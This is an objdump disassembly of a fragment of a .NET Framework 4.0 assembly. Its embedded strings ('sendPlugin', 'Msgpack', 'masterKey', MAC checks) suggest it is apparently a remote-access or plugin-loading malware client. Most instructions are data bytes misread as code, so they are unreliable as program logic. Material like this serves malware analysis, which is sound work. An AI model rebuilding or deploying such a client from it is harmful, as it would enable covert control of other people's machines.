  40c4e5:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40c4e9:	6e                   	outsb  %ds:(%esi),(%dx)
  40c4ea:	00 00                	add    %al,(%eax)
  40c4ec:	07                   	pop    %es
  40c4ed:	44                   	inc    %esp
  40c4ee:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40c4f2:	00 00                	add    %al,(%eax)
  40c4f4:	15 73 00 65 00       	adc    $0x650073,%eax
  40c4f9:	6e                   	outsb  %ds:(%esi),(%dx)
  40c4fa:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40c4fe:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c502:	00 67 00             	add    %ah,0x0(%edi)
  40c505:	69 00 6e 00 00 0d    	imul   $0xd00006e,(%eax),%eax
  40c50b:	48                   	dec    %eax
  40c50c:	00 61 00             	add    %ah,0x0(%ecx)
  40c50f:	73 00                	jae    0x40c511
  40c511:	68 00 65 00 73       	push   $0x73006500
  40c516:	00 00                	add    %al,(%eax)
  40c518:	09 48 00             	or     %ecx,0x0(%eax)
  40c51b:	61                   	popa
  40c51c:	00 73 00             	add    %dh,0x0(%ebx)
  40c51f:	68 00 00 1b 50       	push   $0x501b0000
  40c524:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c528:	00 67 00             	add    %ah,0x0(%edi)
  40c52b:	69 00 6e 00 2e 00    	imul   $0x2e006e,(%eax),%eax
  40c531:	50                   	push   %eax
  40c532:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c536:	00 67 00             	add    %ah,0x0(%edi)
  40c539:	69 00 6e 00 00 07    	imul   $0x700006e,(%eax),%eax
  40c53f:	52                   	push   %edx
  40c540:	00 75 00             	add    %dh,0x0(%ebp)
  40c543:	6e                   	outsb  %ds:(%esi),(%dx)
  40c544:	00 00                	add    %al,(%eax)
  40c546:	0f 4d 00             	cmovge (%eax),%eax
  40c549:	73 00                	jae    0x40c54b
  40c54b:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40c54f:	61                   	popa
  40c550:	00 63 00             	add    %ah,0x0(%ebx)
  40c553:	6b 00 00             	imul   $0x0,(%eax),%eax
  40c556:	11 52 00             	adc    %edx,0x0(%edx)
  40c559:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c55d:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40c561:	76 00                	jbe    0x40c563
  40c563:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  40c568:	0b 45 00             	or     0x0(%ebp),%eax
  40c56b:	72 00                	jb     0x40c56d
  40c56d:	72 00                	jb     0x40c56f
  40c56f:	6f                   	outsl  %ds:(%esi),(%dx)
  40c570:	00 72 00             	add    %dh,0x0(%edx)
  40c573:	00 47 6d             	add    %al,0x6d(%edi)
  40c576:	00 61 00             	add    %ah,0x0(%ecx)
  40c579:	73 00                	jae    0x40c57b
  40c57b:	74 00                	je     0x40c57d
  40c57d:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c581:	4b                   	dec    %ebx
  40c582:	00 65 00             	add    %ah,0x0(%ebp)
  40c585:	79 00                	jns    0x40c587
  40c587:	20 00                	and    %al,(%eax)
  40c589:	63 00                	arpl   %eax,(%eax)
  40c58b:	61                   	popa
  40c58c:	00 6e 00             	add    %ch,0x0(%esi)
  40c58f:	20 00                	and    %al,(%eax)
  40c591:	6e                   	outsb  %ds:(%esi),(%dx)
  40c592:	00 6f 00             	add    %ch,0x0(%edi)
  40c595:	74 00                	je     0x40c597
  40c597:	20 00                	and    %al,(%eax)
  40c599:	62 00                	bound  %eax,(%eax)
  40c59b:	65 00 20             	add    %ah,%gs:(%eax)
  40c59e:	00 6e 00             	add    %ch,0x0(%esi)
  40c5a1:	75 00                	jne    0x40c5a3
  40c5a3:	6c                   	insb   (%dx),%es:(%edi)
  40c5a4:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  40c5a8:	00 6f 00             	add    %ch,0x0(%edi)
  40c5ab:	72 00                	jb     0x40c5ad
  40c5ad:	20 00                	and    %al,(%eax)
  40c5af:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40c5b3:	70 00                	jo     0x40c5b5
  40c5b5:	74 00                	je     0x40c5b7
  40c5b7:	79 00                	jns    0x40c5b9
  40c5b9:	2e 00 00             	add    %al,%cs:(%eax)
  40c5bc:	2d 69 00 6e 00       	sub    $0x6e0069,%eax
  40c5c1:	70 00                	jo     0x40c5c3
  40c5c3:	75 00                	jne    0x40c5c5
  40c5c5:	74 00                	je     0x40c5c7
  40c5c7:	20 00                	and    %al,(%eax)
  40c5c9:	63 00                	arpl   %eax,(%eax)
  40c5cb:	61                   	popa
  40c5cc:	00 6e 00             	add    %ch,0x0(%esi)
  40c5cf:	20 00                	and    %al,(%eax)
  40c5d1:	6e                   	outsb  %ds:(%esi),(%dx)
  40c5d2:	00 6f 00             	add    %ch,0x0(%edi)
  40c5d5:	74 00                	je     0x40c5d7
  40c5d7:	20 00                	and    %al,(%eax)
  40c5d9:	62 00                	bound  %eax,(%eax)
  40c5db:	65 00 20             	add    %ah,%gs:(%eax)
  40c5de:	00 6e 00             	add    %ch,0x0(%esi)
  40c5e1:	75 00                	jne    0x40c5e3
  40c5e3:	6c                   	insb   (%dx),%es:(%edi)
  40c5e4:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40c5e8:	00 00                	add    %al,(%eax)
  40c5ea:	55                   	push   %ebp
  40c5eb:	49                   	dec    %ecx
  40c5ec:	00 6e 00             	add    %ch,0x0(%esi)
  40c5ef:	76 00                	jbe    0x40c5f1
  40c5f1:	61                   	popa
  40c5f2:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40c5f6:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40c5fa:	00 6d 00             	add    %ch,0x0(%ebp)
  40c5fd:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40c601:	73 00                	jae    0x40c603
  40c603:	61                   	popa
  40c604:	00 67 00             	add    %ah,0x0(%edi)
  40c607:	65 00 20             	add    %ah,%gs:(%eax)
  40c60a:	00 61 00             	add    %ah,0x0(%ecx)
  40c60d:	75 00                	jne    0x40c60f
  40c60f:	74 00                	je     0x40c611
  40c611:	68 00 65 00 6e       	push   $0x6e006500
  40c616:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c61a:	00 63 00             	add    %ah,0x0(%ebx)
  40c61d:	61                   	popa
  40c61e:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c622:	00 6f 00             	add    %ch,0x0(%edi)
  40c625:	6e                   	outsb  %ds:(%esi),(%dx)
  40c626:	00 20                	add    %ah,(%eax)
  40c628:	00 63 00             	add    %ah,0x0(%ebx)
  40c62b:	6f                   	outsl  %ds:(%esi),(%dx)
  40c62c:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40c630:	00 20                	add    %ah,(%eax)
  40c632:	00 28                	add    %ch,(%eax)
  40c634:	00 4d 00             	add    %cl,0x0(%ebp)
  40c637:	41                   	inc    %ecx
  40c638:	00 43 00             	add    %al,0x0(%ebx)
  40c63b:	29 00                	sub    %eax,(%eax)
  40c63d:	2e 00 00             	add    %al,%cs:(%eax)
  40c640:	05 58 00 32 00       	add    $0x320058,%eax
  40c645:	00 0f                	add    %cl,(%edi)
  40c647:	7b 00                	jnp    0x40c649
  40c649:	30 00                	xor    %al,(%eax)
  40c64b:	3a 00                	cmp    (%eax),%al
  40c64d:	44                   	inc    %esp
  40c64e:	00 33                	add    %dh,(%ebx)
  40c650:	00 7d 00             	add    %bh,0x0(%ebp)
  40c653:	20 00                	and    %al,(%eax)
  40c655:	00 0f                	add    %cl,(%edi)
  40c657:	7b 00                	jnp    0x40c659
  40c659:	30 00                	xor    %al,(%eax)
  40c65b:	3a 00                	cmp    (%eax),%al
  40c65d:	58                   	pop    %eax
  40c65e:	00 32                	add    %dh,(%edx)
  40c660:	00 7d 00             	add    %bh,0x0(%ebp)
  40c663:	20 00                	and    %al,(%eax)
  40c665:	00 2b                	add    %ch,(%ebx)
  40c667:	28 00                	sub    %al,(%eax)
  40c669:	6e                   	outsb  %ds:(%esi),(%dx)
  40c66a:	00 65 00             	add    %ah,0x0(%ebp)
  40c66d:	76 00                	jbe    0x40c66f
  40c66f:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c673:	20 00                	and    %al,(%eax)
  40c675:	75 00                	jne    0x40c677
  40c677:	73 00                	jae    0x40c679
  40c679:	65 00 64 00 29       	add    %ah,%gs:0x29(%eax,%eax,1)
  40c67e:	00 20                	add    %ah,(%eax)
  40c680:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  40c684:	00 70 00             	add    %dh,0x0(%eax)
  40c687:	65 00 20             	add    %ah,%gs:(%eax)
  40c68a:	00 24 00             	add    %ah,(%eax,%eax,1)
  40c68d:	63 00                	arpl   %eax,(%eax)
  40c68f:	31 00                	xor    %eax,(%eax)
  40c691:	00 45 28             	add    %al,0x28(%ebp)
  40c694:	00 65 00             	add    %ah,0x0(%ebp)
  40c697:	78 00                	js     0x40c699
  40c699:	74 00                	je     0x40c69b
  40c69b:	38 00                	cmp    %al,(%eax)
  40c69d:	2c 00                	sub    $0x0,%al
  40c69f:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40c6a3:	74 00                	je     0x40c6a5
  40c6a5:	31 00                	xor    %eax,(%eax)
  40c6a7:	36 00 2c 00          	add    %ch,%ss:(%eax,%eax,1)
  40c6ab:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40c6af:	33 00                	xor    (%eax),%eax
  40c6b1:	32 00                	xor    (%eax),%al
  40c6b3:	29 00                	sub    %eax,(%eax)
  40c6b5:	20 00                	and    %al,(%eax)
  40c6b7:	74 00                	je     0x40c6b9
  40c6b9:	79 00                	jns    0x40c6bb
  40c6bb:	70 00                	jo     0x40c6bd
  40c6bd:	65 00 20             	add    %ah,%gs:(%eax)
  40c6c0:	00 24 00             	add    %ah,(%eax,%eax,1)
  40c6c3:	63 00                	arpl   %eax,(%eax)
  40c6c5:	37                   	aaa
  40c6c6:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40c6c9:	24 00                	and    $0x0,%al
  40c6cb:	63 00                	arpl   %eax,(%eax)
  40c6cd:	38 00                	cmp    %al,(%eax)
  40c6cf:	2c 00                	sub    $0x0,%al
  40c6d1:	24 00                	and    $0x0,%al
  40c6d3:	63 00                	arpl   %eax,(%eax)
  40c6d5:	39 00                	cmp    %eax,(%eax)
  40c6d7:	00 14 74             	add    %dl,(%esp,%esi,2)
  40c6da:	6b 73 7b 88          	imul   $0xffffff88,0x7b(%ebx),%esi
  40c6de:	11 4e 8d             	adc    %ecx,-0x73(%esi)
  40c6e1:	24 f5                	and    $0xf5,%al
  40c6e3:	ac                   	lods   %ds:(%esi),%al
  40c6e4:	9a d7 a1 0a 00 08 b7 	lcall  $0xb708,$0xaa1d7
  40c6eb:	7a 5c                	jp     0x40c749
  40c6ed:	56                   	push   %esi
  40c6ee:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  40c6f1:	89 03                	mov    %eax,(%ebx)
  40c6f3:	00 00                	add    %al,(%eax)
  40c6f5:	01 03                	add    %eax,(%ebx)
  40c6f7:	20 00                	and    %al,(%eax)
  40c6f9:	01 02                	add    %eax,(%edx)
  40c6fb:	06                   	push   %es
  40c6fc:	0e                   	push   %cs
  40c6fd:	03 06                	add    (%esi),%eax
  40c6ff:	12 09                	adc    (%ecx),%cl
  40c701:	03 06                	add    (%esi),%eax
  40c703:	12 44 03 00          	adc    0x0(%ebx,%eax,1),%al
  40c707:	00 02                	add    %al,(%edx)
  40c709:	03 06                	add    (%esi),%eax
  40c70b:	12 0d 03 06 12 11    	adc    0x11120603,%cl
  40c711:	03 06                	add    (%esi),%eax
  40c713:	1d 05 02 06 0a       	sbb    $0xa060205,%eax
  40c718:	03 06                	add    (%esi),%eax
  40c71a:	12 15 02 06 02 02    	adc    0x2020602,%dl
  40c720:	06                   	push   %es
  40c721:	1c 02                	sbb    $0x2,%al
  40c723:	06                   	push   %es
  40c724:	08 04 00             	or     %al,(%eax,%eax,1)
  40c727:	00 12                	add    %dl,(%edx)
  40c729:	0d 05 00 01 01       	or     $0x1010005,%eax
  40c72e:	12 0d 04 00 00 12    	adc    0x12000004,%cl
  40c734:	11 05 00 01 01 12    	adc    %eax,0x12010100
  40c73a:	11 04 00             	adc    %eax,(%eax,%eax,1)
  40c73d:	00 1d 05 05 00 01    	add    %bl,0x1000505
  40c743:	01 1d 05 03 00 00    	add    %ebx,0x305
  40c749:	0a 04 00             	or     (%eax,%eax,1),%al
  40c74c:	01 01                	add    %eax,(%ecx)
  40c74e:	0a 04 00             	or     (%eax,%eax,1),%al
  40c751:	00 12                	add    %dl,(%edx)
  40c753:	15 05 00 01 01       	adc    $0x1010005,%eax
  40c758:	12 15 04 00 01 01    	adc    0x1010004,%dl
  40c75e:	02 03                	add    (%ebx),%al
  40c760:	00 00                	add    %al,(%eax)
  40c762:	1c 03                	sbb    $0x3,%al
  40c764:	00 00                	add    %al,(%eax)
  40c766:	08 04 00             	or     %al,(%eax,%eax,1)
  40c769:	01 01                	add    %eax,(%ecx)
  40c76b:	08 04 00             	or     %al,(%eax,%eax,1)
  40c76e:	01 02                	add    %eax,(%edx)
  40c770:	0e                   	push   %cs
  40c771:	0a 00                	or     (%eax),%al
  40c773:	04 02                	add    $0x2,%al
  40c775:	1c 12                	sbb    $0x12,%al
  40c777:	19 12                	sbb    %edx,(%edx)
  40c779:	1d 11 21 05 00       	sbb    $0x52111,%eax
  40c77e:	01 01                	add    %eax,(%ecx)
  40c780:	12 25 04 00 01 01    	adc    0x1010004,%ah
  40c786:	1c 04                	sbb    $0x4,%al
  40c788:	08 00                	or     %al,(%eax)
  40c78a:	12 0d 04 08 00 12    	adc    0x12000804,%cl
  40c790:	11 04 08             	adc    %eax,(%eax,%ecx,1)
  40c793:	00 1d 05 03 08 00    	add    %bl,0x80305
  40c799:	0a 04 08             	or     (%eax,%ecx,1),%al
  40c79c:	00 12                	add    %dl,(%edx)
  40c79e:	15 03 08 00 02       	adc    $0x2000803,%eax
  40c7a3:	03 08                	add    (%eax),%ecx
  40c7a5:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40c7a8:	08 00                	or     %al,(%eax)
  40c7aa:	08 03                	or     %al,(%ebx)
  40c7ac:	00 00                	add    %al,(%eax)
  40c7ae:	0e                   	push   %cs
  40c7af:	04 00                	add    $0x0,%al
  40c7b1:	01 0e                	add    %ecx,(%esi)
  40c7b3:	0e                   	push   %cs
  40c7b4:	08 b0 3f 5f 7f 11    	or     %dh,0x117f5f3f(%eax)
  40c7ba:	d5 0a                	aad    $0xa
  40c7bc:	3a 06                	cmp    (%esi),%al
  40c7be:	00 01                	add    %al,(%ecx)
  40c7c0:	12 29                	adc    (%ecx),%ch
  40c7c2:	12 2d 03 06 12 31    	adc    0x31120603,%ch
  40c7c8:	03 00                	add    (%eax),%eax
  40c7ca:	00 18                	add    %bl,(%eax)
  40c7cc:	07                   	pop    %es
  40c7cd:	00 03                	add    %al,(%ebx)
  40c7cf:	08 18                	or     %bl,(%eax)
  40c7d1:	12 35 08 04 00 01    	adc    0x1000408,%dh
  40c7d7:	18 0e                	sbb    %cl,(%esi)
  40c7d9:	06                   	push   %es
  40c7da:	00 02                	add    %al,(%edx)
  40c7dc:	02 18                	add    (%eax),%bl
  40c7de:	10 02                	adc    %al,(%edx)
  40c7e0:	06                   	push   %es
  40c7e1:	00 01                	add    %al,(%ecx)
  40c7e3:	11 30                	adc    %esi,(%eax)
  40c7e5:	11 30                	adc    %esi,(%eax)
  40c7e7:	06                   	push   %es
  40c7e8:	00 03                	add    %al,(%ebx)
  40c7ea:	01 09                	add    %ecx,(%ecx)
  40c7ec:	09 09                	or     %ecx,(%ecx)
  40c7ee:	02 06                	add    (%esi),%al
  40c7f0:	09 03                	or     %eax,(%ebx)
  40c7f2:	06                   	push   %es
  40c7f3:	11 30                	adc    %esi,(%eax)
  40c7f5:	04 00                	add    $0x0,%al
  40c7f7:	00 00                	add    %al,(%eax)
  40c7f9:	80 04 02 00          	addb   $0x0,(%edx,%eax,1)
  40c7fd:	00 00                	add    %al,(%eax)
  40c7ff:	04 01                	add    $0x1,%al
  40c801:	00 00                	add    %al,(%eax)
  40c803:	00 06                	add    %al,(%esi)
  40c805:	00 02                	add    %al,(%edx)
  40c807:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40c80a:	3d 06 00 02 02       	cmp    $0x2020006,%eax
  40c80f:	0e                   	push   %cs
  40c810:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40c815:	1d 05 0e 07 06       	sbb    $0x6070e05,%eax
  40c81a:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c81f:	60                   	pusha
  40c820:	05 00 01 01 12       	add    $0x12010100,%eax
  40c825:	60                   	pusha
  40c826:	04 00                	add    $0x0,%al
  40c828:	01 01                	add    %eax,(%ecx)
  40c82a:	0e                   	push   %cs
  40c82b:	18 06                	sbb    %al,(%esi)
  40c82d:	15 12 45 01 15       	adc    $0x15014512,%eax
  40c832:	12 49 0a             	adc    0xa(%ecx),%cl
  40c835:	12 4d 1c             	adc    0x1c(%ebp),%cl
  40c838:	12 0d 12 09 0e 1d    	adc    0x1d0e0912,%cl
  40c83e:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40c843:	0e                   	push   %cs
  40c844:	04 20                	add    $0x20,%al
  40c846:	00 00                	add    %al,(%eax)
  40c848:	00 04 40             	add    %al,(%eax,%eax,2)
  40c84b:	00 00                	add    %al,(%eax)
  40c84d:	00 04 10             	add    %al,(%eax,%edx,1)
  40c850:	00 00                	add    %al,(%eax)
  40c852:	00 04 20             	add    %al,(%eax,%eiz,1)
  40c855:	01 01                	add    %eax,(%ecx)
  40c857:	0e                   	push   %cs
  40c858:	04 20                	add    $0x20,%al
  40c85a:	01 0e                	add    %ecx,(%esi)
  40c85c:	0e                   	push   %cs
  40c85d:	06                   	push   %es
  40c85e:	20 01                	and    %al,(%ecx)
  40c860:	1d 05 1d 05 07       	sbb    $0x7051d05,%eax
  40c865:	20 02                	and    %al,(%edx)
  40c867:	02 1d 05 1d 05 06    	add    0x6051d05,%bl
  40c86d:	00 01                	add    %al,(%ecx)
  40c86f:	1d 05 1d 05 03       	sbb    $0x3051d05,%eax
  40c874:	06                   	push   %es
  40c875:	11 50 03             	adc    %edx,0x3(%eax)
  40c878:	06                   	push   %es
  40c879:	12 55 05             	adc    0x5(%ebp),%dl
  40c87c:	00 01                	add    %al,(%ecx)
  40c87e:	0e                   	push   %cs
  40c87f:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40c884:	1d 05 0a 05 00       	sbb    $0x50a05,%eax
  40c889:	01 1d 05 08 05 00    	add    %ebx,0x50805
  40c88f:	01 1d 05 06 05 00    	add    %ebx,0x50605
  40c895:	01 1d 05 0d 09 20    	add    %ebx,0x20090d05
  40c89b:	01 01                	add    %eax,(%ecx)
  40c89d:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c8a2:	60                   	pusha
  40c8a3:	03 20                	add    (%eax),%esp
  40c8a5:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40c8a8:	20 00                	and    %al,(%eax)
  40c8aa:	02 03                	add    (%ebx),%al
  40c8ac:	28 00                	sub    %al,(%eax)
  40c8ae:	1c 03                	sbb    $0x3,%al
  40c8b0:	06                   	push   %es
  40c8b1:	12 60 0b             	adc    0xb(%eax),%ah
  40c8b4:	20 02                	and    %al,(%edx)
  40c8b6:	01 12                	add    %edx,(%edx)
  40c8b8:	60                   	pusha
  40c8b9:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c8be:	60                   	pusha
  40c8bf:	04 20                	add    $0x20,%al
  40c8c1:	00 12                	add    %dl,(%edx)
  40c8c3:	60                   	pusha
  40c8c4:	05 20 01 12 60       	add    $0x60120120,%eax
  40c8c9:	0e                   	push   %cs
  40c8ca:	05 20 01 12 60       	add    $0x60120120,%eax
  40c8cf:	0a 05 20 01 12 60    	or     0x60120120,%al
  40c8d5:	0d 05 20 01 12       	or     $0x12012005,%eax
  40c8da:	60                   	pusha
  40c8db:	08 03                	or     %al,(%ebx)
  40c8dd:	20 00                	and    %al,(%eax)
  40c8df:	08 05 28 01 12 60    	or     %al,0x60120128
  40c8e5:	08 03                	or     %al,(%ebx)
  40c8e7:	28 00                	sub    %al,(%eax)
  40c8e9:	08 03                	or     %al,(%ebx)
  40c8eb:	06                   	push   %es
  40c8ec:	11 64 03 06          	adc    %esp,0x6(%ebx,%eax,1)
  40c8f0:	12 5c 04 20          	adc    0x20(%esp,%eax,1),%bl
  40c8f4:	01 08                	add    %ecx,(%eax)
  40c8f6:	0e                   	push   %cs
  40c8f7:	05 20 01 01 12       	add    $0x12010120,%eax
  40c8fc:	61                   	popa
  40c8fd:	04 20                	add    $0x20,%al
  40c8ff:	01 01                	add    %eax,(%ecx)
  40c901:	0a 04 20             	or     (%eax,%eiz,1),%al
  40c904:	01 01                	add    %eax,(%ecx)
  40c906:	0b 03                	or     (%ebx),%eax
  40c908:	20 00                	and    %al,(%eax)
  40c90a:	0b 03                	or     (%ebx),%eax
  40c90c:	20 00                	and    %al,(%eax)
  40c90e:	0a 03                	or     (%ebx),%al
  40c910:	20 00                	and    %al,(%eax)
  40c912:	0d 05 20 01 01       	or     $0x1012005,%eax
  40c917:	1d 05 04 20 00       	sbb    $0x200405,%eax
  40c91c:	1d 05 05 20 02       	sbb    $0x2200505,%eax
  40c921:	01 0e                	add    %ecx,(%esi)
  40c923:	0e                   	push   %cs
  40c924:	05 20 02 01 0e       	add    $0xe010220,%eax
  40c929:	08 04 20             	or     %al,(%eax,%eiz,1)
  40c92c:	01 02                	add    %eax,(%edx)
  40c92e:	0e                   	push   %cs
  40c92f:	03 20                	add    (%eax),%esp
  40c931:	00 0e                	add    %cl,(%esi)
  40c933:	04 20                	add    $0x20,%al
  40c935:	01 01                	add    %eax,(%ecx)
  40c937:	02 04 20             	add    (%eax,%eiz,1),%al
  40c93a:	01 01                	add    %eax,(%ecx)
  40c93c:	0c 04                	or     $0x4,%al
  40c93e:	20 01                	and    %al,(%ecx)
  40c940:	01 0d 04 20 00 12    	add    %ecx,0x12002004
  40c946:	5c                   	pop    %esp
  40c947:	04 20                	add    $0x20,%al
  40c949:	00 11                	add    %dl,(%ecx)
  40c94b:	64 04 20             	fs add $0x20,%al
  40c94e:	00 12                	add    %dl,(%edx)
  40c950:	59                   	pop    %ecx
  40c951:	03 28                	add    (%eax),%ebp
  40c953:	00 0e                	add    %cl,(%esi)
  40c955:	03 28                	add    (%eax),%ebp
  40c957:	00 0a                	add    %cl,(%edx)
  40c959:	03 28                	add    (%eax),%ebp
  40c95b:	00 0d 04 28 00 12    	add    %cl,0x12002804
  40c961:	5c                   	pop    %esp
  40c962:	04 28                	add    $0x28,%al
  40c964:	00 11                	add    %dl,(%ecx)
  40c966:	64 04 00             	fs add $0x0,%al
  40c969:	00 00                	add    %al,(%eax)
  40c96b:	00 04 03             	add    %al,(%ebx,%eax,1)
  40c96e:	00 00                	add    %al,(%eax)
  40c970:	00 04 04             	add    %al,(%esp,%eax,1)
  40c973:	00 00                	add    %al,(%eax)
  40c975:	00 04 05 00 00 00 04 	add    %al,0x4000000(,%eax,1)
  40c97c:	06                   	push   %es
  40c97d:	00 00                	add    %al,(%eax)
  40c97f:	00 04 07             	add    %al,(%edi,%eax,1)
  40c982:	00 00                	add    %al,(%eax)
  40c984:	00 04 08             	add    %al,(%eax,%ecx,1)
  40c987:	00 00                	add    %al,(%eax)
  40c989:	00 04 09             	add    %al,(%ecx,%ecx,1)
  40c98c:	00 00                	add    %al,(%eax)
  40c98e:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40c991:	00 00                	add    %al,(%eax)
  40c993:	00 04 0b             	add    %al,(%ebx,%ecx,1)
  40c996:	00 00                	add    %al,(%eax)
  40c998:	00 06                	add    %al,(%esi)
  40c99a:	00 02                	add    %al,(%edx)
  40c99c:	0e                   	push   %cs
  40c99d:	12 61 08             	adc    0x8(%ecx),%ah
  40c9a0:	05 00 01 0e 12       	add    $0x120e0100,%eax
  40c9a5:	61                   	popa
  40c9a6:	06                   	push   %es
  40c9a7:	00 02                	add    %al,(%edx)
  40c9a9:	0e                   	push   %cs
  40c9aa:	05 12 61 05 00       	add    $0x56112,%eax
  40c9af:	01 01                	add    %eax,(%ecx)
  40c9b1:	12 61 06             	adc    0x6(%ecx),%ah
  40c9b4:	00 02                	add    %al,(%edx)
  40c9b6:	01 12                	add    %edx,(%edx)
  40c9b8:	61                   	popa
  40c9b9:	0e                   	push   %cs
  40c9ba:	07                   	pop    %es
  40c9bb:	00 02                	add    %al,(%edx)
  40c9bd:	01 12                	add    %edx,(%edx)
  40c9bf:	61                   	popa
  40c9c0:	1d 05 06 00 02       	sbb    $0x2000605,%eax
  40c9c5:	01 12                	add    %edx,(%edx)
  40c9c7:	61                   	popa
  40c9c8:	0d 06 00 02 01       	or     $0x1020006,%eax
  40c9cd:	12 61 0c             	adc    0xc(%ecx),%ah
  40c9d0:	06                   	push   %es
  40c9d1:	00 02                	add    %al,(%edx)
  40c9d3:	01 12                	add    %edx,(%edx)
  40c9d5:	61                   	popa
  40c9d6:	02 06                	add    (%esi),%al
  40c9d8:	00 02                	add    %al,(%edx)
  40c9da:	01 12                	add    %edx,(%edx)
  40c9dc:	61                   	popa
  40c9dd:	0b 06                	or     (%esi),%eax
  40c9df:	00 02                	add    %al,(%edx)
  40c9e1:	01 12                	add    %edx,(%edx)
  40c9e3:	61                   	popa
  40c9e4:	0a 03                	or     (%ebx),%al
  40c9e6:	06                   	push   %es
  40c9e7:	11 78 04             	adc    %edi,0x4(%eax)
  40c9ea:	20 01                	and    %al,(%ecx)
  40c9ec:	01 08                	add    %ecx,(%eax)
  40c9ee:	08 01                	or     %al,(%ecx)
  40c9f0:	00 08                	add    %cl,(%eax)
  40c9f2:	00 00                	add    %al,(%eax)
  40c9f4:	00 00                	add    %al,(%eax)
  40c9f6:	00 1e                	add    %bl,(%esi)
  40c9f8:	01 00                	add    %eax,(%eax)
  40c9fa:	01 00                	add    %eax,(%eax)
  40c9fc:	54                   	push   %esp
  40c9fd:	02 16                	add    (%esi),%dl
  40c9ff:	57                   	push   %edi
  40ca00:	72 61                	jb     0x40ca63
  40ca02:	70 4e                	jo     0x40ca52
  40ca04:	6f                   	outsl  %ds:(%esi),(%dx)
  40ca05:	6e                   	outsb  %ds:(%esi),(%dx)
  40ca06:	45                   	inc    %ebp
  40ca07:	78 63                	js     0x40ca6c
  40ca09:	65 70 74             	gs jo  0x40ca80
  40ca0c:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40ca13:	77 73                	ja     0x40ca88
  40ca15:	01 05 20 01 01 11    	add    %eax,0x11010120
  40ca1b:	71 08                	jno    0x40ca25
  40ca1d:	01 00                	add    %eax,(%eax)
  40ca1f:	02 00                	add    (%eax),%al
  40ca21:	00 00                	add    %al,(%eax)
  40ca23:	00 00                	add    %al,(%eax)
  40ca25:	05 01 00 00 00       	add    $0x1,%eax
  40ca2a:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40ca2d:	00 07                	add    %al,(%edi)
  40ca2f:	31 2e                	xor    %ebp,(%esi)
  40ca31:	30 2e                	xor    %ch,(%esi)
  40ca33:	30 2e                	xor    %ch,(%esi)
  40ca35:	30 00                	xor    %al,(%eax)
  40ca37:	00 65 01             	add    %ah,0x1(%ebp)
  40ca3a:	00 29                	add    %ch,(%ecx)
  40ca3c:	2e 4e                	cs dec %esi
  40ca3e:	45                   	inc    %ebp
  40ca3f:	54                   	push   %esp
  40ca40:	46                   	inc    %esi
  40ca41:	72 61                	jb     0x40caa4
  40ca43:	6d                   	insl   (%dx),%es:(%edi)
  40ca44:	65 77 6f             	gs ja  0x40cab6
  40ca47:	72 6b                	jb     0x40cab4
  40ca49:	2c 56                	sub    $0x56,%al
  40ca4b:	65 72 73             	gs jb  0x40cac1
  40ca4e:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40ca55:	30 2c 50             	xor    %ch,(%eax,%edx,2)
  40ca58:	72 6f                	jb     0x40cac9
  40ca5a:	66 69 6c 65 3d 43 6c 	imul   $0x6c43,0x3d(%ebp,%eiz,2),%bp
  40ca61:	69 65 6e 74 01 00 54 	imul   $0x54000174,0x6e(%ebp),%esp
  40ca68:	0e                   	push   %cs
  40ca69:	14 46                	adc    $0x46,%al
  40ca6b:	72 61                	jb     0x40cace
  40ca6d:	6d                   	insl   (%dx),%es:(%edi)
  40ca6e:	65 77 6f             	gs ja  0x40cae0
  40ca71:	72 6b                	jb     0x40cade
  40ca73:	44                   	inc    %esp
  40ca74:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40ca7b:	61                   	popa
  40ca7c:	6d                   	insl   (%dx),%es:(%edi)
  40ca7d:	65 1f                	gs pop %ds
  40ca7f:	2e 4e                	cs dec %esi
  40ca81:	45                   	inc    %ebp
  40ca82:	54                   	push   %esp
  40ca83:	20 46 72             	and    %al,0x72(%esi)
  40ca86:	61                   	popa
  40ca87:	6d                   	insl   (%dx),%es:(%edi)
  40ca88:	65 77 6f             	gs ja  0x40cafa
  40ca8b:	72 6b                	jb     0x40caf8
  40ca8d:	20 34 20             	and    %dh,(%eax,%eiz,1)
  40ca90:	43                   	inc    %ebx
  40ca91:	6c                   	insb   (%dx),%es:(%edi)
